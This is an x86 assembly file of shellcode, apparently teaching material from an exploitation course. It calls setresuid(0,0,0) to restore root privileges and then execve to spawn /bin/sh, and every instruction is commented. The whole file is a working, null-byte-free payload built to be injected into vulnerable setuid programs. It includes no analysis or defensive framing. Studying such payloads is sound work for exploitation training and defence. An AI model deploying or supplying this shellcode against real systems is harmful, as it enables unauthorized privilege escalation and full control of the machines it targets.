BITS 32

; setresuid(uid_t ruid, uid_t euid, uid_t suid);
  xor eax, eax      ; Zero out eax.
  xor ebx, ebx      ; Zero out ebx.
  xor ecx, ecx      ; Zero out ecx.
  cdq               ; Zero out edx using the sign bit from eax.
  mov BYTE al, 0xa4 ; syscall 164 (0xa4)
  int 0x80          ; setresuid(0, 0, 0)  Restore all root privs.

; execve(const char *filename, char *const argv [], char *const envp[])
  push BYTE 11      ; push 11 to the stack.
  pop eax           ; pop the dword of 11 into eax.
  push ecx          ; push some nulls for string termination.
  push 0x68732f2f   ; push "//sh" to the stack.
  push 0x6e69622f   ; push "/bin" to the stack.
  mov ebx, esp      ; Put the address of "/bin//sh" into ebx via esp.
  push ecx          ; push 32-bit null terminator to stack.
  mov edx, esp      ; This is an empty array for envp.
  push ebx          ; push string addr to stack above null terminator.
  mov ecx, esp      ; This is the argv array with string ptr.
  int 0x80          ; execve("/bin//sh", ["/bin//sh", NULL], [NULL])
